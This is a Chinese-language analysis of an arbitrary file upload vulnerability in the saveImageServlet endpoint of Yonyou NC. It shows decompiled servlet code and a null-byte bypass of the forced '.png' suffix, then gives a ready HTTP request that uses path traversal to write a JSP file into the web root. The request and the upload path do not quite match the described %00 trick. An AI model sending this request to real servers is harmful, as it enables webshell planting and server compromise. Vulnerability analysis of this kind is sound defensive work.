## saveImageServlet 任意文件上传漏洞分析

官方更新了一个漏洞，说saveImageServlet接口存在任意文件上传漏洞 ，分析一下

```java
package nc.uap.wfm.action;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FilterOutputStream;
import java.io.IOException;
import java.util.UUID;
import javax.servlet.ServletException;
import javax.servlet.ServletInputStream;
import nc.uap.lfw.core.exception.LfwRuntimeException;
import nc.uap.lfw.servletplus.annotation.Action;
import nc.uap.lfw.servletplus.annotation.Servlet;
import nc.uap.wfm.action.WfBaseServlet;
import nc.uap.wfm.logger.WfmLogger;

@Servlet(path="/servlet/saveImageServlet")
public class SaveImageServlet
extends WfBaseServlet {
    private static final long serialVersionUID = -5603687395645617927L;

    @Action(method="POST")
    public void doPost() throws ServletException, IOException {
        this.response.setContentType("application/octet-stream");
        String filename = this.request.getParameter("filename");
        if (filename == null || "".equals(filename)) {
            filename = UUID.randomUUID().toString();
        }
        filename = filename + ".png";
        String savePath = this.request.getRealPath("") + "/processxml/images/" + filename;
        ServletInputStream is = this.request.getInputStream();
        FilterOutputStream dos = null;
        try {
            int size = 0;
            byte[] tmp = new byte[10240];
            File f = new File(savePath);
            dos = new DataOutputStream(new FileOutputStream(f));
            int len = -1;
            while ((len = is.read(tmp)) != -1) {
                ((DataOutputStream)dos).write(tmp, 0, len);
                size += len;
            }
            ((DataOutputStream)dos).flush();
            dos.close();
        }
        catch (IOException e) {
            WfmLogger.error((String)e.getMessage(), (Throwable)e);
            throw new LfwRuntimeException(e.getMessage());
        }
        finally {
            try {
                if (is != null) {
                    is.close();
                }
            }
            catch (Exception e) {
                WfmLogger.error((Throwable)e);
            }
            try {
                if (dos != null) {
                    dos.close();
                }
            }
            catch (Exception e) {
                WfmLogger.error((Throwable)e);
            }
        }
    }
}

```
![image](https://github.com/wy876/JavaCode/assets/139549762/0aad419b-a532-4e59-bd6f-45fa77ca57c4)

从代码上看，上传文件名进行了处理，` filename = filename + ".png";`   将后缀拼接上了.png格式然后将文件上传，因为强制加上了.png

按道理来说是不存在漏洞的

本地我也进行测试了，基本上不可以，上传的文件都被强制加上了png

![image](https://github.com/wy876/JavaCode/assets/139549762/470d6ac4-82b1-41e8-9c70-bbd786f6f757)

想起来之前网上有文章 利用Windows特性加上 `%00 ` 就成功上传了

![image](https://github.com/wy876/JavaCode/assets/139549762/f802bd33-a0c2-4b50-ab5a-a0e93f382bd7)



数据包：

```
POST /portal/pt/servlet/saveImageServlet/doPost?pageId=login&filename=../test.jsp HTTP/1.1
Host: 192.168.63.129:8088
Content-Type: application/octet-stream
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 19

111
```

文件上传路径`http://ip:port/portal/processxml/1.jsp`

